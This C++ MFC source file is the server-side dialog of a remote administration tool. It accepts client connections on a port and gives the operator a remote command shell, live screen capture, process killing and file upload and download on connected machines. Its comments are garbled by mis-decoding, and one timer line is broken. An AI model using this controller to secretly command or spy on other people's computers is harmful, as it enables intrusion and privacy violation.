
// MfcServerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "MfcServer.h"
#include "MfcServerDlg.h"
#include "afxdialogex.h"
#include "CmdDlg.h"
#include "ScreenDlg.h"
#include "Process.h"
#include "MyExplorer.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
//
#define NO_HEARTBEAT

unsigned char g_aryUncomRes[0xFF0000];

// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
  CAboutDlg();

  // �Ի�������
  enum { IDD = IDD_ABOUTBOX };

protected:
  virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

  // ʵ��
protected:
  DECLARE_MESSAGE_MAP()
public:
  //	afx_msg void OnCmd();
protected:
  //  afx_msg LRESULT OnMyprocdata(WPARAM wParam, LPARAM lParam);
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
  CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
  //	ON_COMMAND(ID_32771, &CAboutDlg::OnCmd)
  //  ON_MESSAGE(WM_MYPROCDATA, &CAboutDlg::OnMyprocdata)
END_MESSAGE_MAP()


// CMfcServerDlg �Ի���



CMfcServerDlg::CMfcServerDlg(CWnd* pParent /*=NULL*/)
  : CDialogEx(CMfcServerDlg::IDD, pParent)
  , m_nPort(0)
{
  m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMfcServerDlg::DoDataExchange(CDataExchange* pDX)
{
  CDialogEx::DoDataExchange(pDX);
  DDX_Control(pDX, IDC_COMBO1, m_ComboIP);
  DDX_Control(pDX, IDC_EDIT2, m_EdPort);
  DDX_Text(pDX, IDC_EDIT2, m_nPort);
  DDV_MinMaxInt(pDX, m_nPort, 1, 65535);
  DDX_Control(pDX, IDC_LIST1, m_Lst);
}

BEGIN_MESSAGE_MAP(CMfcServerDlg, CDialogEx)
  ON_WM_SYSCOMMAND()
  ON_WM_PAINT()
  ON_WM_QUERYDRAGICON()
  ON_BN_CLICKED(IDOK, &CMfcServerDlg::OnBnClickedOk)
  ON_BN_CLICKED(IDC_START, &CMfcServerDlg::OnBnClickedStart)
  ON_NOTIFY(NM_RCLICK, IDC_LIST1, &CMfcServerDlg::OnNMRClickList1)
  ON_COMMAND(ID_32771, &CMfcServerDlg::OnCmd)
  ON_COMMAND(ID_32772, &CMfcServerDlg::OnScreen)
  ON_WM_TIMER()
  ON_MESSAGE(WM_MYSCREENSTART, &CMfcServerDlg::OnMyscreenstart)
  ON_MESSAGE(WM_MYCMDSTART, &CMfcServerDlg::OnCreateCmdDlg)
  ON_COMMAND(ID_32773, &CMfcServerDlg::OnSetProcData)
  ON_MESSAGE(WM_MYPROCSTART, &CMfcServerDlg::OnMyprocstart)
  ON_COMMAND(ID_32774, &CMfcServerDlg::OnMyExplorer)
  ON_BN_CLICKED(IDC_STOP, &CMfcServerDlg::OnBnClickedStop)
  ON_MESSAGE(WM_MYEXPLORERSTART, &CMfcServerDlg::OnMyexplorerstart)
END_MESSAGE_MAP()


// CMfcServerDlg ��Ϣ�������

BOOL CMfcServerDlg::OnInitDialog()
{
  CDialogEx::OnInitDialog();

  // ��������...���˵�����ӵ�ϵͳ�˵��С�

  // IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
  ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
  ASSERT(IDM_ABOUTBOX < 0xF000);

  CMenu* pSysMenu = GetSystemMenu(FALSE);
  if (pSysMenu != NULL)
  {
    BOOL bNameValid;
    CString strAboutMenu;
    bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
    ASSERT(bNameValid);
    if (!strAboutMenu.IsEmpty())
    {
      pSysMenu->AppendMenu(MF_SEPARATOR);
      pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
    }
  }

  // ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
  //  ִ�д˲���
  SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
  SetIcon(m_hIcon, FALSE);		// ����Сͼ��

  // TODO:  �ڴ���Ӷ���ĳ�ʼ������
  
  (0, 15*1000, 0);

  //���õ�ǰ��IP�Ͷ˿�
  //m_EdPort.SetWindowText()

  //����IP
  char szHostName[255] = { 0 };
  hostent* pHostent = NULL;
  int nRet = gethostname(szHostName, 255);
  if (nRet == 0)
  {
    pHostent = gethostbyname(szHostName);
    int* pIp = NULL;
    int i = 0;
    while (pHostent->h_addr_list[i] != NULL)
    {
      pIp = reinterpret_cast<int*>(pHostent->h_addr_list[i]);
      IN_ADDR addr;
      addr.S_un.S_addr = *pIp;
      m_ComboIP.InsertString(i, inet_ntoa(addr));
      i++;
    }
  }

  m_ComboIP.InsertString(0, "0.0.0.0");
  m_ComboIP.SetCurSel(0);

  //���ö˿�
  m_nPort = 10086;

  //�����б�ͷ��Ϣ
  m_Lst.InsertColumn(0, "���");
  m_Lst.InsertColumn(1, "IP:port");

  //�����п�
  m_Lst.SetColumnWidth(0, LVSCW_AUTOSIZE_USEHEADER);
  m_Lst.SetColumnWidth(1, LVSCW_AUTOSIZE_USEHEADER);

  //����List���
  m_Lst.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | m_Lst.GetExtendedStyle());

  //��ʼ��IOCPģ��
  m_IOCP.Create(this);

  UpdateData(FALSE);

  ((CButton*)GetDlgItem(IDC_START))->EnableWindow(TRUE);
  ((CButton*)GetDlgItem(IDC_STOP))->EnableWindow(FALSE);

#ifdef _DEBUG
  OnBnClickedStart();
#endif

  return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CMfcServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
  if ((nID & 0xFFF0) == IDM_ABOUTBOX)
  {
    CAboutDlg dlgAbout;
    dlgAbout.DoModal();
  }
  else
  {
    CDialogEx::OnSysCommand(nID, lParam);
  }
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CMfcServerDlg::OnPaint()
{
  if (IsIconic())
  {
    CPaintDC dc(this); // ���ڻ��Ƶ��豸������

    SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

    // ʹͼ���ڹ����������о���
    int cxIcon = GetSystemMetrics(SM_CXICON);
    int cyIcon = GetSystemMetrics(SM_CYICON);
    CRect rect;
    GetClientRect(&rect);
    int x = (rect.Width() - cxIcon + 1) / 2;
    int y = (rect.Height() - cyIcon + 1) / 2;

    // ����ͼ��
    dc.DrawIcon(x, y, m_hIcon);
  }
  else
  {
    CDialogEx::OnPaint();
  }
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CMfcServerDlg::OnQueryDragIcon()
{
  return static_cast<HCURSOR>(m_hIcon);
}



void CMfcServerDlg::OnBnClickedOk()
{
  // TODO:  �ڴ���ӿؼ�֪ͨ����������
  //CDialogEx::OnOK();
}

//���տͻ��˷�����������
DWORD RecvFunc(LPVOID lpParam)
{
  CMfcServerDlg* pDlg = reinterpret_cast<CMfcServerDlg*>(lpParam);
  BOOL bRet = false;
  do
  {
    bRet = pDlg->OnAccept();
  } while (bRet);

  return 0;
}

void CMfcServerDlg::OnBnClickedStart()
{
  ((CButton*)GetDlgItem(IDC_START))->EnableWindow(FALSE);
  ((CButton*)GetDlgItem(IDC_STOP))->EnableWindow(TRUE);

  //��ʼ����
  //1. ����TCP socket
  UpdateData(TRUE);
  m_sListen = socket(AF_INET,
    SOCK_STREAM, //��ʽ����
    IPPROTO_TCP);

  //2. �󶨶˿� bind
  //sockaddr addr;
  sockaddr_in addr = { 0 };
  addr.sin_family = AF_INET;
  addr.sin_port = htons(m_nPort); // htonl
  int nIndex = m_ComboIP.GetCurSel();
  CString strIp;
  m_ComboIP.GetLBText(nIndex, strIp);
  addr.sin_addr.S_un.S_addr = inet_addr(strIp.GetBuffer(0));

  int nRet = bind(m_sListen, (sockaddr*)&addr, sizeof(sockaddr_in));
  if (nRet == SOCKET_ERROR)
  {
    return;
  }

  //3. ���� listen
  listen(m_sListen, SOMAXCONN);

  //�����̵߳ȴ��û�������
  m_hAcceptThread = (HANDLE)_beginthreadex(NULL,
    0,
    (PFN_start_address)RecvFunc,
    this,
    0,
    NULL);
  //4. �ȴ����� accept

}

//�����Ҽ��˵�
void CMfcServerDlg::OnNMRClickList1(NMHDR *pNMHDR, LRESULT *pResult)
{
  LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

  //�����Ҽ��˵�
  CMenu menu;
  menu.LoadMenu(IDR_MENU1);
  CMenu* pSubMenu = menu.GetSubMenu(0);

  POINT pt;
  GetCursorPos(&pt);

  pSubMenu->TrackPopupMenu(TPM_LEFTALIGN,
    pt.x,
    pt.y,
    this
    );

  *pResult = 0;
}

// ��ʾCMD����
LRESULT CMfcServerDlg::OnCreateCmdDlg(WPARAM wParam, LPARAM lParam)
{
  TagClientContext* pContext = (TagClientContext*)wParam;

  //����һ����ģ̬�Ի���
  pContext->m_pCmdDlg = new CCmdDlg(pContext->m_sClient);
  if (pContext->m_pCmdDlg != NULL)
  {
    pContext->m_pCmdDlg->Create(IDD_DIALOG1);
    pContext->m_pCmdDlg->ShowWindow(SW_SHOWNORMAL);
  }
  return 0;
}

// ��ӦCMD�Ҽ��˵���
void CMfcServerDlg::OnCmd()
{
  //��ȡ��ǰ��ѡ����
  int nIndex = m_Lst.GetSelectionMark();
  if (nIndex == -1)
  {
    return;
  }

  //������Ϣ���ͻ�,֪ͨ�ͻ�׼��cmd��Ϣ
  SOCKET sClient = m_Lst.GetItemData(nIndex);

  //SendPacket(sClient, CMD_REQ);
  m_IOCP.Send(sClient, CMD_REQ);
}

// ��Ӧ��Ļ�Ҽ��˵���
void CMfcServerDlg::OnScreen()
{
  //��ȡ��ǰ��ѡ����
  int nIndex = m_Lst.GetSelectionMark();
  if (nIndex == -1)
  {
    return;
  }

  //������Ϣ���ͻ�,֪ͨ�ͻ�׼��cmd��Ϣ
  SOCKET sClient = m_Lst.GetItemData(nIndex);

  //SendPacket(sClient, SCREEN_REQ);
  m_IOCP.Send(sClient, SCREEN_REQ);
}

// ��ʾ��Ļ����
afx_msg LRESULT CMfcServerDlg::OnMyscreenstart(WPARAM wParam, LPARAM lParam)
{
  TagClientContext* pContext = (TagClientContext*)wParam;

  //����һ����ģ̬�Ի���
  pContext->m_pScreenDlg = new CScreenDlg(pContext->m_sClient);
  if (pContext->m_pScreenDlg != NULL)
  {
    pContext->m_pScreenDlg->Create(IDD_DIALOG2);
    pContext->m_pScreenDlg->ShowWindow(SW_SHOWNORMAL);
  }

  return 0;
}

//����������
void CMfcServerDlg::OnTimer(UINT_PTR nIDEvent)
{
  // TODO:  �ڴ������Ϣ�����������/�����Ĭ��ֵ
#ifndef NO_HEARTBEAT
  //����map
  m_cs.Lock();
  std::map<SOCKET, TagClientContext*>::iterator itTmp;
  std::map<SOCKET, TagClientContext*>::iterator it = m_ClientMap.begin();
  m_Lst.DeleteAllItems();
  
  for (; it != m_ClientMap.end(); /*it++*/)
  {
    TagClientContext* pCurClient = it->second;
    itTmp = it++;
    if (clock() - pCurClient->m_curClock > 30 * 1000)
    {
      //�ӽ����г�ȥ���ߵ��б���
      m_Lst.DeleteItem(pCurClient->m_nListItemIndex);
      //�ر�socket
      closesocket(pCurClient->m_sClient);
      //�ͷ���Դ
      pCurClient->release();
      //��������ɾ��
      m_ClientMap.erase(itTmp);
    }
    else
    {
      pCurClient->m_curClock = clock(); // reflash time
      //����������
      SendPacket(pCurClient->m_sClient, HEART_REQ);
    }
  }

  m_cs.Unlock();
#endif

  CDialogEx::OnTimer(nIDEvent);
}

// ��Ӧ������Ϣ�Ҽ��˵���
void CMfcServerDlg::OnSetProcData()
{
  //��ȡ��ǰ��ѡ����
  int nIndex = m_Lst.GetSelectionMark();
  if (nIndex == -1)
  {
    return;
  }

  //������Ϣ���ͻ�,֪ͨ�ͻ�׼��������Ϣ
  SOCKET sClient = m_Lst.GetItemData(nIndex);

  SendPacket(sClient, PROCESS_REQ);
}

// ��ʾ������Ϣ����
afx_msg LRESULT CMfcServerDlg::OnMyprocstart(WPARAM wParam, LPARAM lParam)
{
  TagClientContext* pContext = reinterpret_cast<TagClientContext*>(wParam);

  //����һ����ģ̬�Ի���
  pContext->m_pProcessDlg = new CProcess(pContext->m_sClient);
  if (pContext->m_pProcessDlg != NULL)
  {
    pContext->m_pProcessDlg->Create(IDD_DIALOG3);
    pContext->m_pProcessDlg->ShowWindow(SW_SHOWNORMAL);
  }

  return 0;
}

// ��Ӧ��Դ���������ļ����Ҽ��˵���
void CMfcServerDlg::OnMyExplorer()
{
  //��ȡ��ǰ��ѡ����
  int nIndex = m_Lst.GetSelectionMark();
  if (nIndex == -1)
  {
    return;
  }

  //������Ϣ���ͻ�,֪ͨ�ͻ�׼���ļ���Ϣ
  SOCKET sClient = m_Lst.GetItemData(nIndex);

  SendPacket(sClient, FILE_REQ);
}

// ������Դ������
afx_msg LRESULT CMfcServerDlg::OnMyexplorerstart(WPARAM wParam, LPARAM lParam)
{
  TagClientContext* pContext = (TagClientContext*)wParam;

  //����һ����ģ̬�Ի���
  pContext->m_pExplorerDlg = new CMyExplorer(pContext->m_sClient);
  if (pContext->m_pExplorerDlg != NULL)
  {
    pContext->m_pExplorerDlg->Create(IDD_DIALOG4);
    pContext->m_pExplorerDlg->ShowWindow(SW_SHOWNORMAL);
  }

  return 0;
}

// �������Ͽ���֪ͨ���пͻ���
void CMfcServerDlg::OnBnClickedStop()
{
  ((CButton*)GetDlgItem(IDC_START))->EnableWindow(TRUE);
  ((CButton*)GetDlgItem(IDC_STOP))->EnableWindow(FALSE);

  m_cs.Lock();
  std::map<SOCKET, TagClientContext*>::iterator itTmp;
  std::map<SOCKET, TagClientContext*>::iterator it
    = m_ClientMap.begin();
  for (; it != m_ClientMap.end(); it++)
  {
    TagClientContext* pCurClient = it->second;
    closesocket(pCurClient->m_sClient);
  }
  this->m_Lst.DeleteAllItems();
  m_cs.Unlock();

}


bool CMfcServerDlg::OnAccept()
{
  CMfcServerDlg* pDlg = this;

  sockaddr_in clientAddr = { 0 };
  clientAddr.sin_family = AF_INET;
  int nAddrLength = sizeof(sockaddr_in);
  SOCKET sClient = accept(pDlg->m_sListen, (sockaddr*)&clientAddr, &nAddrLength);

  if (sClient == INVALID_SOCKET)
  {
    return false;
  }

  //��������socket���뵽list��
  CString strIndex;
  strIndex.Format("%d", pDlg->m_Lst.GetItemCount());
  CString strIp;
  strIp.Format("%s:%d", inet_ntoa(clientAddr.sin_addr), ntohs(clientAddr.sin_port));

  int nListIndex = pDlg->m_Lst.InsertItem(0, strIndex.GetBuffer());
  pDlg->m_Lst.SetItemText(nListIndex, 1, strIp.GetBuffer());
  //pDlg->m_Lst.InsertItem(1, strIp.GetBuffer());

  pDlg->m_Lst.SetItemData(nListIndex, sClient);

  //�½�һ���ͻ���Context
  TagClientContext* pContext = new TagClientContext;
  pContext->m_sClient = sClient;
  pContext->m_MainDlg = pDlg;
  pContext->m_nListItemIndex = nListIndex;
  pContext->m_curClock = clock();


  //���pContext��hash����
  pDlg->m_cs.Lock();
  //FD_SET(sClient, &pDlg->m_readFds);

  m_IOCP.Bind(sClient, sClient);

  //���ɹ��Ľ��������Ӻ�,��ҪͶ�ݵ�һ��Recv����
  m_IOCP.PostRecv(pContext);
  pDlg->m_ClientMap.insert(
    std::pair<SOCKET, TagClientContext*>(sClient, pContext));
  pDlg->m_cs.Unlock();

  return true;
}

bool CMfcServerDlg::OnRecvData(
  TagClientContext* pContext,
  char nType,
  CBuffer& strRecv,
  int nBufSize)
{
  PBYTE pBuf = strRecv.GetBuffer();

  switch (nType)
  {
    case FILE_RLY:
    {
      //����һ���µ�Explorer����
      if (pContext->m_MainDlg != NULL)
      {
        pContext->m_MainDlg->SendMessage(WM_MYEXPLORERSTART, (WPARAM)pContext, 0);
      }
    }
      break;

    case FILE_UPLOAD_DATA_RLY:
    {
      // ��ʼ�ͻ��˻ظ�׼�����ϴ�
      if (pContext->m_pExplorerDlg != NULL)
      {
        pContext->m_pExplorerDlg->SendMessage(WM_MYUPLOAD, (WPARAM)pBuf, nBufSize);
      }
    }
      break;

    case FILE_DOWNLOAD_RLY:
    {
      // ��ʼ�ͻ��˻ظ�׼��������
      if (pContext->m_pExplorerDlg != NULL)
      {
        pContext->m_pExplorerDlg->SendMessage(WM_MYDOWNLOAD, (WPARAM)pBuf, nBufSize);
      }
    }
      break;

    case FILE_LOGICDRIVE_DATA_RLY:
    {
      // �õ��ͻ��˷���������Ϣ�Ļظ�
      if (pContext->m_pExplorerDlg != NULL)
      {
        pContext->m_pExplorerDlg->SendMessage(WM_MYEXPLORERDRIVEDATA, (WPARAM)pBuf, nBufSize);
      }
    }
      break;

    case FILE_LIST_DATA_RLY:
    {
      // �õ�ָ���ļ������ļ���Ϣ�Ļظ�
      if (pContext->m_pExplorerDlg != NULL)
      {
        pContext->m_pExplorerDlg->SendMessage(WM_MYEXPLORERFILELIST, (WPARAM)pBuf, nBufSize);
      }
    }
      break;

    case CMD_RLY:
    {
      //��ʾ�ͻ��˳ɹ�������cmd.exe������
      //����һ���µ�cmd����
      if (pContext->m_MainDlg != NULL)
      {
        pContext->m_MainDlg->SendMessage(WM_MYCMDSTART, (WPARAM)pContext, 0);
      }
    }
      break;
    case CMD_DATA_RLY:
    {
      //��ʾ��ʼ����CMD��Ϣ
      if (pContext->m_pCmdDlg != NULL)
      {
//          uLong nOldsize = *(uLong *)&pBuf[nBufSize - sizeof(uLong)];
//  
//          uLong uLuncomSize = nBufSize - sizeof(uLong);
// 
//          Bytef* pDeCompressBuf = new Bytef[nOldsize];
//          if (pDeCompressBuf == NULL)
//          {
//            break;
//          }
// 
//          ZeroMemory(pDeCompressBuf, nOldsize);
// 
//          memcpy(pDeCompressBuf, pBuf, uLuncomSize);
//  
//          int nRet = uncompress((Bytef *)pDeCompressBuf, &uLuncomSize, (Bytef *)pBuf, uLuncomSize);
//         if (Z_OK != nRet)
//         {
//           if (pDeCompressBuf != NULL)
//           {
//             delete pDeCompressBuf;
//             pDeCompressBuf = NULL;
//           }
// 
//           check_error(nRet);
// 
//           break;
//         }
//         
//         CBuffer bufTmp;
//         bufTmp.Write(pDeCompressBuf, uLuncomSize);
// 
//         pContext->m_pCmdDlg->SendMessage(WM_MYCMDDATA, (WPARAM)&bufTmp, (LPARAM)uLuncomSize);
        pContext->m_pCmdDlg->SendMessage(WM_MYCMDDATA, (WPARAM)pBuf, (LPARAM)nBufSize);

      }
    }
      break;
    case PROCESS_RLY:
    {
      //��ʾ�յ��˴��������Ϣ�����ȷ��
      if (pContext->m_pProcessDlg == NULL)
      {
        if (pContext->m_MainDlg != NULL)
        {
          pContext->m_MainDlg->SendMessage(WM_MYPROCSTART, (WPARAM)pContext, 0);
        }
      }
      else
      {
        pContext->m_pProcessDlg->ShowWindow(SW_SHOWNORMAL);
      }
      // ���ڴ����ɹ�����������
      SendPacket(pContext->m_sClient, PROCESS_DATA_REQ);
    }
      break;
    case PROCESS_DATA_RLY:
    {
      //��ʾ�յ��˴��������Ϣ�����ȷ��
      if (pContext->m_pProcessDlg != NULL)
      {
        {
          pContext->m_pProcessDlg->SendMessage(WM_MYSETPROCDATA, (WPARAM)pBuf, (LPARAM)pContext);
        }
      }
    }
      break;
    case PROCESS_CLS_RLY_SCS:
    {
      //��ʾ�յ��˽������̳ɹ���ȷ��
      pContext->m_pProcessDlg->SendMessage(WM_MYCLSPROCSCS, (WPARAM)nBufSize, (LPARAM)pBuf);
    }
      break;

    case PROCESS_CLS_RLY_FAIL:
    {
      //��ʾ�յ��˽�������ʧ�ܵ�ȷ��
      pContext->m_pProcessDlg->SendMessage(WM_MYCLSPROCFAIL, (WPARAM)nBufSize, (LPARAM)pBuf);
    }
      break;

    case SCREEN_RLY:
    {
      //��ʾ�յ���cmd.exe������
      //OnHandleCmdData(pBuf, nBufSize);
      //������ʾ����

      if (pContext->m_pScreenDlg == NULL)
      {
        if (pContext->m_MainDlg != NULL)
        {
          pContext->m_MainDlg->SendMessage(WM_MYSCREENSTART, (WPARAM)pContext, 0);
        }
      }
      else
      {
        //pContext->m_pScreenDlg->ShowWindow(SW_SHOWNORMAL);
      }

	  //���ͽ�ͼ	   
      pContext->m_pScreenDlg->SendMessage(WM_MYSCREENDATA, (WPARAM)pBuf, (LPARAM)nBufSize);

      //�����ٷ�һ����Ļ��ͼ
      m_IOCP.Send(pContext->m_sClient, SCREEN_REQ);
    }
      break;

    case HEART_RLY:
    {
      // �ж��Ƿ�ʱ�������ʱ���͸��½��棬����ʧЧ�ڵ�
      // 15����pingһ�Σ��鿴�Ƿ���
      int nTimeNow = clock();
      if(nTimeNow - pContext->m_curClock > 3600*15)
      {
        // ��ʱ
        /*pContext->m_nListItemIndex;*/
        nTimeNow = nTimeNow;
      }
    }
      break;
  }

  //ɾ��һ�������İ�
  strRecv.Delete(nBufSize);

  return true;
}

